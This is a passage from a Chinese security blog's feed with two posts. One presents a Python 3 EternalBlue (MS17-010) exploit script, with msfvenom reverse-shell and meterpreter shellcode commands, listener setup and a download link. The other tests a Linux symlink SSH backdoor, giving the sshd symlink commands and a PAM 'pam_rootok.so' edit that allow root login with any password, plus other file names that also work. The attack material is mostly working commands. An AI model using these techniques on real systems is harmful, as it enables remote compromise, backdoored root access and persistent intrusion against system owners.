    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>前段时间Equation Group泄露Eternalblue(MS17-010)的利用工具，搭建环境比较麻烦，借助exploit-db上的exp优化修改了一个纯python3的利用脚本。<br> <a id="more"></a></p><h2 id="0x01-使用简介"><a href="#0x01-使用简介" class="headerlink" title="0x01 使用简介"></a>0x01 使用简介</h2><p>1.直接运行python3 ./ms17-010.py，提示使用方法及以x64为例的shellcode生成命令（亲测直接用Dll文件会蓝屏）<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Usage</span>: python3 ./ms17-010.py --host xxx --file xxx --port xxx</span><br><span class="line"></span><br><span class="line">[!] You can make a nc reverse shell USER_SHELLCODE_FILE in kali2.0 by use :</span><br><span class="line">    "msfvenom -p windows/x64/shell_reverse_tcp   LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode"</span><br><span class="line"></span><br><span class="line">[!] You can make a meterpreter reverse shell USER_SHELLCODE_FILE in kali2.0 by use :</span><br><span class="line">    "msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=x.x.x.x LPORT=xxx -f raw &gt; shellcode"</span><br></pre></td></tr></table></figure></p><p>2.直接运行python3 ./ms17-010.py -h提示参数的含义（除非getshell以后的特殊提权利用以外，通常不需要修改端口号）<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">usage</span>: ms17-010.py [-h] [--host HOST] [--port PORT] [--file FILE]</span><br><span class="line"></span><br><span class="line">Process some integers.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --host HOST, -H HOST  Host ip</span><br><span class="line">  --port PORT, -p PORT  Target port,defalut:445</span><br><span class="line">  --file FILE, -f FILE  User shellcode file</span><br></pre></td></tr></table></figure></p><p>3.利用反弹shellcode需要在反弹主机上监听对应端口<br>3.1 nc:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure></p><p>3.2 meterpreter:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="builtin-name">set</span> windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="builtin-name">set</span> lhost x.x.x.x</span><br><span class="line"><span class="builtin-name">set</span> lport xxx</span><br></pre></td></tr></table></figure></p><h2 id="0x02-源码"><a href="#0x02-源码" class="headerlink" title="0x02 源码"></a>0x02 源码</h2><p><a href="http://blackwolfsec.cc/static/code/ms17-010.py">http://blackwolfsec.cc/static/code/ms17-010.py</a></p><p>提示:<br>本博客里任何文章/动画/教程以及各类软件/工具等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;前段时间Equation Group泄露Eternalblue(MS17-010)的利用工具，搭建环境比较麻烦，借助exploit-db上的exp优化修改了一个纯python3的利用脚本。&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="Python" scheme="http://blackwolfsec.cc/tags/Python/"/>
    
      <category term="Windows" scheme="http://blackwolfsec.cc/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>Linux软连接ssh后门之我见</title>
    <link href="http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/"/>
    <id>http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/</id>
    <published>2017-03-23T16:00:00.000Z</published>
    <updated>2017-08-18T01:59:16.044Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习了Sevck发表Linux软连接后门的<a href="https://xianzhi.aliyun.com/forum/mobile/read/790.html" target="_blank" rel="noopener">《一条命令引发的思考》</a>，还是存在几个疑惑点，仔细探究之后就有了这篇文章<br><a id="more"></a></p><h2 id="0x01简单回顾"><a href="#0x01简单回顾" class="headerlink" title="0x01简单回顾"></a>0x01简单回顾</h2><p><strong>一、Linux经典软连接后门命令</strong><br>1.在被控制端执行：<br>ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345建立sshd的软连接<br>2.本地客户端执行：<br>ssh <a href="mailto:root@x.x.x.x" target="_blank" rel="noopener">root@x.x.x.x</a> -p 12345接着输入任意密码就可以root用户权限登陆了<br>实际测试中发现，如果root用户被禁止登陆时此方式不能直接登陆，但是可以利用其他存在的用户身份登陆，如：<br>ssh <a href="mailto:ubuntu@x.x.x.x" target="_blank" rel="noopener">ubuntu@x.x.x.x</a> -p 12345接着输入任意密码就可以ubuntu用户权限登陆了<br><strong>二、后门原理</strong><br> 在sshd服务配置运行PAM认证的前提下，PAM配置文件中控制标志为sufficient时只要pam_rootok模块检测uid为0（root）即可成功认证登陆</p><h2 id="0x02疑惑与探究"><a href="#0x02疑惑与探究" class="headerlink" title="0x02疑惑与探究"></a>0x02疑惑与探究</h2><p>1.不建立链接直接启动/usr/sbin/sshd是否也能任意密码登陆<br>针对这个疑惑很容易验证，被控端执行命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/sshd -oport=12345</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_00.png" alt="直接启动sshd" title="ssh_backdoor_00.png"><br>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>登录失败<br>实践结果表明不能通过直接启动/usr/sbin/sshd,默认使用/etc/pam.d/sshd的pam配置文件，因而不能建立任意密码登录的后门<br>2.sshd是否允许PAM认证对后门是否有影响<br>修改<code>/etc/ssh/sshd_config</code>修改设置<code>UsePAM no</code></p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_0.png" alt="设置UsePAM=no" title="ssh_backdoor_0.png"><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345</span><br></pre></td></tr></table></figure></p><p>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>登录失败</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_1.png" alt="sshd禁止pam登陆" title="ssh_backdoor_1.png"></p><p>实践结果表明禁止sshd使用PAM认证后，ssh登陆不调用PAM，严格验证用户密码，所以不能建立任意密码登录后门。<br>3.软连接的路径及文件名是否有限制<br>首先验证修改路径对后门功能是否有影响，修改软连接路径为<code>/home/su</code><br>被控端执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /home/su;/home/su -oport=12345</span><br></pre></td></tr></table></figure></p><p>客户端ssh root:任意密码@x.x.x.x 12345仍然成功登陆</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_2.png" alt="修改软连接/home/su" title="ssh_backdoor_2.png"></p><p>实践表明软连接的路径对后门的功能没有影响<br>其次修改软连接文件名对后门功能是否有影响，修改软连接为<code>/tmp/pam_test</code><br>被控端执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/pam_test;/tmp/pam_test -oport=12345</span><br></pre></td></tr></table></figure></p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_3.png" alt="修改软连接为/tmp/pam_test" title="ssh_backdoor_3.png"><br>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>认证失败<br>实践表明软连接的文件名会影响后门功能，而且在ssh开启pam认证的前提下，默认调用的pam配置文件按是软连接的文件名（pam_test）<br>4.此类ssh后门的核心是pam配置中的pam_rootok.so，是否只需包含这句话就可以实现后门功能,默认的配置文件中出来su，是否还有其他的可利用的配置文件<br>在被控端<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"auth sufficient pam_rootok.so"</span> &gt;&gt; /etc/pam.d/hacker</span><br><span class="line">cat /etc/pam.d/hacker</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/hacker;/tmp/hacker -oport=12345</span><br></pre></td></tr></table></figure></p><p>客户端<code>ssh root:任意密码@x.x.x.x 12345</code>认证成功</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_4.png" alt="pam_rootok.so" title="ssh_backdoor_4.png"><br>实践表明通过软连接文件名指定ssh的pam配置文件为hacker,只要文件中包含<code>auth sufficient pam_rootok.so</code>即可无密码登陆<br>最后在<code>etc/pam.d/</code>目录下查找包含<code>pam_rootok.so</code>配置的文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ |xargs grep <span class="string">"pam_rootok"</span></span><br></pre></td></tr></table></figure></p><p>在笔者的测试环境下还有”chsh”、”chfn”包含<code>pam_rootok.so</code><br>被控端执行：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12346</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12347</span><br></pre></td></tr></table></figure></p><p>客户端<code>ssh root:任意密码@x.x.x.x 12346</code>仍然认证成功<br>客户端<code>ssh root:任意密码@x.x.x.x 12347</code>仍然认证成功</p><p><img src="http://blackwolfsec.cc/static/picture/ssh_backdoor_5.png" alt="其他可用后门软连接命名" title="ssh_backdoor_5.png"></p><h2 id="0x03小结"><a href="#0x03小结" class="headerlink" title="0x03小结"></a>0x03小结</h2><ol><li>Linux软连接ssh后门需要ssh配置允许PAM认证才能使用</li><li>如果被控主机不允许root登陆可用其他已存在用户登陆</li><li>通过软连接的方式，实质上PAM认证是通过软连接的文件名（如：/tmp/su,/home/su）在<code>/etc/pam.d/</code>目录下寻找对应的PAM配置文件(如：/etc/pam.d/su)</li><li>任意密码登陆的核心是<code>auth sufficient pam_rootok.so</code>,只要PAM配置文件中包含此配置即可SSH任意密码登陆，实践表明，可成功利用的PAM配置文件除了su还有chsh、chfn</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;学习了Sevck发表Linux软连接后门的&lt;a href=&quot;https://xianzhi.aliyun.com/forum/mobile/read/790.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;《一条命令引发的思考》&lt;/a&gt;，还是存在几个疑惑点，仔细探究之后就有了这篇文章&lt;br&gt;
    
    </summary>
    
      <category term="Security" scheme="http://blackwolfsec.cc/categories/Security/"/>
    
    
      <category term="Security" scheme="http://blackwolfsec.cc/tags/Security/"/>
    
      <category term="Linux" scheme="http://blackwolfsec.cc/tags/Linux/"/>
    
  </entry>
  
</feed>
